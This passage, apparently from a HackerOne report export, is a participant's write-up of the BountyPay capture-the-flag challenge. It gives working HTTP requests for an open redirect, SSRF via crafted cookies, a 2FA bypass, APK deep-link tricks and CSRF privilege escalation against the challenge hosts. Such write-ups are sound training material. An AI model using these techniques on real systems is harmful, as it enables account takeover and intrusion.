mess","markdown_message":"\u003cp\u003eI accidentally posted my report although I haven\u0026#39;t finished writing it. I will add the final one in another comment, sorry for the mess\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-09T17:30:28.589Z","updated_at":"2020-06-09T17:30:28.589Z","actor":{"username":"shakedko","cleared":false,"url":"/shakedko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ak1oSZijBCAPDuMVcNi2Mosb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8246375,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"## TL;DR\n\nFlag is: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.\n\nThank you for this awesome challenge! \n\n## Introduction\n\nI have participated in this CTF as I wanted to see how far I'd be able to get considering the fact that I'm doing bug bounty for a relatively short period of time. \n\nComing from the software engineering world, I wanted to see how I'd be able to implement my thinking process and figure out as much as I can by myself.\n\n## Tools \n\nI have used several tools during this process. You may find these tools in the following links:\n\n- [ffuf](https://github.com/ffuf/ffuf) for fuzzing.\n\u003e A fast web fuzzer written in Go.\n\n- Word lists mainly from [SecLists] (https://github.com/danielmiessler/SecLists/).\n\u003e SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.\n \n- [dex2jar](https://github.com/pxb1988/dex2jar)\n\u003e d2j-dex2jar: Convert .dex file to .class files (zipped as jar)\n\n- [JD-GUI](http://java-decompiler.github.io/)\n\u003e JD-GUI is a standalone graphical utility that displays Java source codes of ‚Äú.class‚Äù files. You can browse the reconstructed source code with the JD-GUI for instant access to methods and fields.\n\n- [Android Studio](https://developer.android.com/studio)\n\u003e Android Studio is the official integrated development environment for Google's Android operating system, built on JetBrains' IntelliJ IDEA software and designed specifically for Android development. \n\n- [ngrok](https://ngrok.com/)\n\u003e Public URLs for building webhook integrations.\n\n- [findomain](https://github.com/Edu4rdSHL/findomain)\n\u003e The fastest and cross-platform subdomain enumerator.\n\n\n## Description \n\nHackerOne has [tweeted](https://twitter.com/Hacker0x01/status/1266454022124376064/photo/1) about the mentioned CTF on its Twitter account, describing what would be the end result once the CTF is done: \n\n\u003e We need your help! CEO \n@martenmickos\n needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us? https://hackerone.com/h1-ctf \n\nThis meant that until there wasn't a place to make a payment, the CTF wasn't over. This kept me on track as every time I finished a step, as  I knew that I was on the right track but there was still something to be found. \n\n## Steps\n\n1. Reconnaissance (Subdomain Enumration, Understanding the Application, Content Discovery).\n2. Open Redirect.\n3. Information Disclosure (Log File).\n4. Improper Authorization (2FA Bypass).\n5. SSRF (Via Cookie using Open Redirect).\n6. Information Disclosure (Directory Listing, In-house APK).\n7. Reverse Enginerring (APK).\n8. Information Disclosure (Twitter Account).\n9. Authentication Bypass (Creating Sandra's user).\n10.  CSRF, Parameter Pollution, Privilege Escalation via CSRF (CSS Class, `template` parameter).\n11.  Information Disclosure (CEO username \u0026 password).\n12.  SSRF (Via `.css` file).\n13.  CSS Keylogger via SSRF.\n\n### Step 1 - Reconnaissance \n\n#### Subdomain Enumartion\n\nThe scope `*.bountypay.h1ctf.com`, mentioned at https://hackerone.com/h1-ctf, made it clear that there are subdomains to be found, therefore the first thing I did was running a subdomain enumoration:\n\n```bash\n$ findomain -t bountypay.h1ctf.com\n\nTarget ==\u003e bountypay.h1ctf.com\n\nSearching in the Facebook API... üîç\nSearching in the Bufferover API... üîç\nSearching in the Threatminer API... üîç\nSearching in the AnubisDB API... üîç\nSearching in the CertSpotter API... üîç\nSearching in the Urlscan.io API... üîç\nSearching in the Threatcrowd API... üîç\nSearching in the Crtsh database API... üîç\nSearching in the Virustotal API... üîç\nSearching in the Sublist3r API... üîç\nSearching in the Spyse API... üîç\n\nstaff.bountypay.h1ctf.com\nsoftware.bountypay.h1ctf.com\napi.bountypay.h1ctf.com\napp.bountypay.h1ctf.com\nwww.bountypay.h1ctf.com\nbountypay.h1ctf.com\n\nA total of 6 subdomains were found for domain bountypay.h1ctf.com üëΩ in 2 seconds.‚è≤Ô∏è\n\nGood luck Hax0r üíÄ!\n```\n\n#### Understanding the Application \n\nI hit all the domains, learnt how and what existed, including texts, descriptions, assets such as js and css and so on. Once done, I continued with my recon by fuzzing `app.bountypay.h1ctf.com`.  \n\n#### Content Discovery\n\nAfter learning about the application and figuring which subdomains were available, I started to search for directories and files. This process gave me some fruits for later on, including: \n\n- GET https://app.bountypay.h1ctf.com/cgit \n- GET https://app.bountypay.h1ctf.com/.git\n- GET https://api.bountypay.h1ctf.com/api\n- GET https://api.bountypay.h1ctf.com/api/staff\n- GET https://api.bountypay.h1ctf.com//api/accounts/\u003cword\u003e\n\n### Step 2 - Open Redirect\n\nWhile doing my recon, I saw that https://api.bountypay.h1ctf.com as an open redirect on the main page: https://api.bountypay.h1ctf.com/redirect?url=... I knew that this would be useful later on so I kept it in my notes and moved to the next thing I found during my recon\n\n#### Step 3 - Information Disclosure (Log File)\n\nScanning the `cgit` directory mentioned above, under the content discovery recon, I found information disclosure exposing a .git repository: \n\n```bash\ncat httpsapp.bountypay.h1ctf.com-cgit-FUZZ.fuzz.json | jq '.results[]'\n{\n  \"input\": {\n    \"FUZZ\": \"config\"\n  },\n  \"position\": 97,\n  \"status\": 200,\n  \"length\": 278,\n  \"words\": 19,\n  \"lines\": 12,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/config\"\n}\n{\n  \"input\": {\n    \"FUZZ\": \"index\"\n  },\n  \"position\": 20,\n  \"status\": 200,\n  \"length\": 0,\n  \"words\": 1,\n  \"lines\": 1,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/index\"\n}\n{\n  \"input\": {\n    \"FUZZ\": \"description\"\n  },\n  \"position\": 3838,\n  \"status\": 200,\n  \"length\": 73,\n  \"words\": 10,\n  \"lines\": 2,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/description\"\n}\n```\n\nLooking into these files, I have found  https://app.bountypay.h1ctf.com/cgit/config exposed a github repository: https://github.com/bounty-pay-code/request-logger.git which contained one file [logger.php](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php) that showed me the way to the next step: \n\n```php\n\u003c?php\n\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n````\n\n[https://app.bountypay.h1ctf.com/bp_web_trace.log](bp_web_trace.log) log file contained the following base64 decoded strings: \n\n```\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\nDecoding these strings resulted with the username, password, a hint about a 2FA challenge and a possible action within the app: \n\n```\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\n### Step 4 - Improper Authorization\n\nOnce I tried to login with the credentials that I found, aka `username: brian.oliver`, `password: V7h0inzX`, I saw a 2FA. \n\nLooking into the input fields in the HTML, I saw that the challenge and the challenge's answer were sent together within the same request. I had it clear that the challenge was hashed with md5, so I tried to use my own hash by using `md5 -s 1` which resulted with `c4ca4238a0b923820dcc509a6f75849b` and then I just used `1` in order to login, and it worked. The request looked like this:\n\n```bash\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Length: 101\nContent-Type: application/x-www-form-urlencoded\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=c4ca4238a0b923820dcc509a6f75849b\u0026challenge_answer=1\n```\n\nand the response: \n\n```bash\nHTTP/1.1 302 Found\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:14:12 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: keep-alive\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 09-Jul-2020 16:14:12 GMT; Max-Age=2592000\nLocation: /\nContent-Length: 0\n```\n\nUsing this new cookie, I was logged in as Brian Oliver.\n\n### Step 5 - SSRF\n\nAfter I bypassed the application's 2FA using Brain Oliver's credentials, I tried to play with the application's feature. The application had only one available feature which was suppose to show me the payment statements of the company, but trying to fetch this data resulted with nothing new. \n\nI looked into the request and I saw that it was doing the following request: \n\n```bash\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nReferer: https://app.bountypay.h1ctf.com/\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n\n```\n\nWhile returning the following response:\n\n```bash\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:17:38 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 177\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=01\u0026year=2020\",\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-01\\\",\\\"transactions\\\":[]}\"}\n```\n\nAt that point I also looked at the token cookie, which I got when I bypassed the 2FA. Once I decoded its base64, I figured that I might be able to change the request by using the cookie. \n\nThe cookie: `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` \nDecoded: `{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}` \n\nConsidering the fact that the `account_id` was available in both the cookie and the response from the request above, I tried to change it and see how it reacted. This is the point where I was finally able to use the open redirect that I have found on stage 2. \n\nI created a new cookie: `{\"account_id\":\"../../redirect?url=FUZZ\u0026\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}` and passed it to ffuf using a script that generated a wordlist and encoded all of the possible words in base64. My wordlist was a mix of two things: \n\n1. Known words and files\n2. Ideas I got while doing recon - one thing I figured during the recon was that the software.bountypay.h1ctf.com was only accessable from within the company's network and if I find an SSRF, together with the open redirect, I would have defintly checked it out. \n\nPutting everything together, I found a directory listing while fuzzing which leads me to the next step \n\n### Step 6 - Information Disclosure (Directory Listing, In-house APK)\n\nAs mentioned in the previous step, I got a hit while fuzzing through the SSRF by using the open redirect I have found earlier. The final request was as following: \n\n```bash\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyYiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\n\n```\n\nand it's response gave me the hint for the next step: \n\n```bash\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:27:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 491\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/..\\/..\\/redirect?url=https:\\/\\/software.bountypay.h1ctf.com\\/uploads\\/\u0026\\/statements?month=01\u0026year=2020\",\"data\":\"\u003chtml\u003e\\n\u003chead\u003e\u003ctitle\u003eIndex of \\/uploads\\/\u003c\\/title\u003e\u003c\\/head\u003e\\n\u003cbody bgcolor=\\\"white\\\"\u003e\\n\u003ch1\u003eIndex of \\/uploads\\/\u003c\\/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\\\"..\\/\\\"\u003e..\\/\u003c\\/a\u003e\\n\u003ca href=\\\"\\/uploads\\/BountyPay.apk\\\"\u003eBountyPay.apk\u003c\\/a\u003e                                        20-Apr-2020 11:26              4043701\\n\u003c\\/pre\u003e\u003chr\u003e\u003c\\/body\u003e\\n\u003c\\/html\u003e\\n\"}\n```\n\nLooking at the JSON response, we can see that there was an APK file availble in /uploads/BountyPay.apk. Hitting the full URL https://software.bountypay.h1ctf.com/uplodas/ worked even for non authenticated users. \n\n### Step 7 - Reverse Enginerring (APK)\n\nWhen I see an APK or a target that has an APK I usually check its content by either unzipping it or disaassmbiling it. \n\nIn this case, I used dex2jar in order to create a .jar file which allowed me to read the code of the APK together with JD-GUI. \n\nOnce I had the code, I ran the APK using Android Studio's \"Profile or debug APK\". \n\nThere are plenty of hints within the code and the first one I followed was using the deep links. This helped me understand how to load the 3 different Android Activities: \n\n- one://part\n- two://part\n- three://part\n\nEach part had a required URI with different parameters that were available in the code. \n\nIn order to move from part one to part two, all I had to do was putting the following URL in the Launch Options: `one://part?start=PartTwoActivity` \n\n{F861011}\n\nI figured that I needed the `start=PartTwoActivity` together with a username as it was stated in the code: \n\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n    String str = getIntent().getData().getQueryParameter(\"start\");\n    if (str != null \u0026\u0026 str.equals(\"PartTwoActivity\") \u0026\u0026 sharedPreferences.contains(\"USERNAME\")) {\n    ...\n    startActivity(new Intent((Context)this, PartTwoActivity.class));\n    } \n} \n```\n\nOnce I was on the second Activity, I saw in the code that all inputs where invsible:\n\n```java\nEditText editText = (EditText)findViewById(2131230834);\nButton button = (Button)findViewById(2131230794);\nTextView textView = (TextView)findViewById(2131231002);\neditText.setVisibility(4);\nbutton.setVisibility(4);\ntextView.setVisibility(4\n```\n\nand all I had to do in order to make them visible was figuring out the params within the URL: \n\n```java\nUri uri = getIntent().getData();\nString str1 = uri.getQueryParameter(\"two\");\nString str2 = uri.getQueryParameter(\"switch\");\nif (str1 != null \u0026\u0026 str1.equals(\"light\") \u0026\u0026 str2 != null \u0026\u0026 str2.equals(\"on\")) {\n    editText.setVisibility(0);\n    button.setVisibility(0);\n    textView.setVisibility(0);\n} \n```\n\nTherefore, the URL was: `two://part?two=light\u0026switch=on`. This resulted with a hash, an input field which asked for a header name. \n\n{F861012}\n\nWhile doing some recon, I already saw a suspicious base64 code in the 3rd Activity:\n\n```java\nbyte[] decodedDirectory = Base64.decode(\"aG9zdA==\", 0);\n\nbyte[] decodedDirectoryTwo = Base64.decode(\"WC1Ub2tlbg==\", 0);\n\nfinal String directory = \"aG9zdA==\";\n\nfinal String directoryTwo = \"WC1Ub2tlbg==\";\n\nfinal String headerDirectory = \"header\";\n````\n\nDecoding both resulted with the following strings: \n\n```bash\n$ \"WC1Ub2tlbg==\" | base64 -d\nX-Token: \n$ \"aG9zdA==\" | base64 -d\nhost\n```\n\nUsing the `X-Token` header I got to the 3rd Activity, which again had insvisible components: \n\n```java\nprotected void onCreate(Bundle paramBundle) {\n    ...\n    final EditText editText = (EditText)findViewById(2131230837);\n    final Button button = (Button)findViewById(2131230796);\n    editText.setVisibility(4);\n    button.setVisibility(4);\n    ...\n}\n```\n\nLooking into the code, I saw that there was an HTTP request that was supposed to be fired once everything had been loaded correctly: \n\n```java\nthis.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {\n    public void onCancelled(DatabaseError param1DatabaseError) {\n        Log.e(\"TAG\", \"onCancelled\", (Throwable)param1DatabaseError.toException());\n    }\n    \n    public void onDataChange(DataSnapshot param1DataSnapshot) {\n        String str = (String)param1DataSnapshot.getValue();\n        if (firstParam != null \u0026\u0026 decodedFirstParam.equals(\"PartThreeActivity\") \u0026\u0026 secondParam != null \u0026\u0026 decodedSecondParam.equals(\"on\")) {\n        String str1 = thirdParam;\n        if (str1 != null) {\n            StringBuilder stringBuilder = new StringBuilder();\n            stringBuilder.append(\"X-\");\n            stringBuilder.append(str);\n            if (str1.equals(stringBuilder.toString())) {\n            editText.setVisibility(0);\n            button.setVisibility(0);\n            PartThreeActivity.this.thread.start();\n            } \n        } \n        } \n    }\n}\n```\n\nUsing the following URL: `three://part?switch=b24%3D\u0026three=UGFydFRocmVlQWN0aXZpdHk%3D\u0026header=X-Token` I was able to execute this code\n\n{F861013}\n\nI got the `HOST` header and the `X-Token` header in Android Studio's Logcat\n\n```\n2020-06-09 20:06:37.938 6261-6309/bounty.pay D/HOST¬†IS:: http://api.bountypay.h1ctf.com\n2020-06-09 20:06:37.939 6261-6309/bounty.pay D/TOKEN¬†IS:: 8e9998ee3137ca9ade8f372739f062c1\n2020-06-09 20:06:37.940 6261-6309/bounty.pay D/HEADER¬†VALUE¬†AND¬†HASH: X-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\n\n{F861010}\n\nIt's important to note that I didn't really have to open the APK in an emulator, as I could have edited the `user_created.xml` via `adb`. However, I wanted to actually see what I was facing with as it made it much more clear for me. \n\nThe last Activity had helped me to figure that there's more than just a token and a host. There were two more things that will be useful in the next two steps: \n\n1. There's a POST request to the exposed host, but something is missing. \n2. The twitter handle made me think that I might have missed something while doing my recon, so I got back to it and found that there was a new employe called Sandra.\n\n### Step 8 - Information Disclosure (Twitter Account)\n\nBountyPay's [Twitter account](https://twitter.com/BountypayHQ) [tweeted a welcome message](https://twitter.com/BountypayHQ/status/1258692286256500741) about a new employe. Looking for this employee, I found an interesting string which seemed like an ID: \nhttps://twitter.com/SandraA76708114/status/1258693001964068864/photo/1\n\n{F861014}\n\n### Step 9 - Authentication Bypass (Creating Sandra's user)\n\nAfter I saw the POST request in the APK together with the host and the X-Token header, I went back to my notes, as I remembered that there were few endpoints that I wasn't able to test due to a missing token. \n\nI first tried to hit `https://api.bountypay.h1ctf.com/api/staff` using the X-Token. This gave me an interesting result: \n\n```bash\nGET /api/staff? HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n\n```\n\nResponse\n```bash\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n````\n\nAfter I saw this, I tried to do the same with the following POST request: \n\n```bash\nPOST /api/staff?firstParam=UGFydFRocmVlQWN0aXZpdHk%3D HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:84DJKEIP38\n```\n\nBut that resutled with the following reponse: \n\n```bash\nHTTP/1.1 409 Conflict\nServer: nginx/1.14.0 (Ubuntu)\nDate: Wed, 03 Jun 2020 13:15:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 39\n\n[\"Staff Member already has an account\"]\n```\n\nClearly, as Sandra was part of the staff, I went back to Sandra's id and tried her `staff_id`: \n\n```bash\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 36\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:8FJ3KFISL3\n```\n\nAnd got the following response: \n\n```bash\nHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Wed, 03 Jun 2020 19:42:33 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 110\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\n### Step 10 - CSRF, Parameter Pollution, Privilege Escalation via CSRF\n\nOnce I got staff credentials, I opened https://staff.bountypay.h1ctf.com and logged in with Sandra's account. \n\nThe staff dashboard introduced a [javascript file](https://staff.bountypay.h1ctf.com/js/website.js) that looked like the right place to start from:\n\n```javascript\n$(\".upgradeToAdmin\").click(function() {\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n}), $(\".tab\").click(function() {\n    return $(\".tab\").removeClass(\"active\"), $(this).addClass(\"active\"), $(\"div.content\").addClass(\"hidden\"), $(\"div.content-\" + $(this).attr(\"data-target\")).removeClass(\"hidden\"), !1\n}), $(\".sendReport\").click(function() {\n    $.get(\"/admin/report?url=\" + url, function() {\n        alert(\"Report sent to admin team\")\n    }), $(\"#myModal\").modal(\"hide\")\n}), document.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\n\nI figured that I'd have to make all of the following to happen all at once: \n\n1. Send a report to an admin.\n2. Make the admin to trigger a click on upgradeToAdmin button.\n3. Make sure Sandra's username would be injected to an input form. \n\nWithin the report, I figured that I had to send a URL containg a `#tab2` in the url (or any other tabs for that matter) as this will trigger a click.\n\nThen, in order to make an automated click, I replaced my avatar with `upgradeToAdmin tab tab2` by editing my profile: \n\n```bash\nPOST /?template=home HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nConnection: close\nContent-Length: 67\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nReferer: https://staff.bountypay.h1ctf.com/?template=home\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n\nprofile_name=sandra1\u0026profile_avatar=avatar1 tab upgradeToAdmin tab2\n```\n\nEnding up with a new cookie in the response:\n\n```bash\nHTTP/1.1 302 Found\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 07 Jun 2020 22:18:02 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nSet-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzRURHQnNvUU55ckRtOTZyWllJcWgzL3J6Uk9BK21iWnVEYkt1U0JrZFNoODMzMVB4MmFiYWg5YXBwSG1NeWNNUmYrUUJiU084U2JwST0%3D; expires=Tue, 07-Jul-2020 22:18:02 GMT; Max-Age=2592000; path=/\nLocation: /?template=home\nContent-Length: 0\n\n```\n\nNow I had to figure how to inject the username. This took some time, but at the end I thought about the way Hackerone uses its parameters and tried the same by passing a template array instead of template string, i.e: \n\nhttps://staff.bountypay.h1ctf.com/?template[]=login\u0026template[]=ticket\u0026username=sandra.allison\u0026ticket_id=3582#tab2\n\nUsing this URL I had 2 templates loaded: \n\n{F861126}\n\nNow all I had to do was sending the encoded URL to the admin: \n\n```bash\nGET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRpY2tldF9pZD0zNTgyI3RhYjI= HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nConnection: close\nAccept: */*\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://staff.bountypay.h1ctf.com/?template=ticket\u0026ticket_id=3582\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,he;q=0.8\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzRURHQnNvUU55ckRtOTZyWllJcWgzL3J6Uk9BK21iWnVEYkt1U0JrZFNoODMzMVB4MmFiYWg5YXBwSG1NeWNNUmYrUUJiU084U2JwST0%3D\n\n```\n\nand a new cookie was generated \n\n```bash\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 07 Jun 2020 22:18:47 GMT\nContent-Type: application/json\nConnection: close\nSet-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzNktXd3VtR2tVcURtOTZyWllJcWgzL3J6Uk9BK21iWjdaYkt1UkJrTloxc21qaGFkd05lR2s5cTF2U1dFMWRwbFYrMWRlU09BUmJwST0%3D; expires=Tue, 07-Jul-2020 22:18:47 GMT; Max-Age=2592000; path=/\nContent-Length: 19\n\n[\"Report received\"]\n\n```\n\n\n### Step 13 - Information Disclosure (CEO username \u0026 password)\n\nAs an Admind I was able to see the application's users: \n\n{F861125}\n\nso I took the Marten Mickos' credentials, opened https://app.bountypay.h1ctf.com 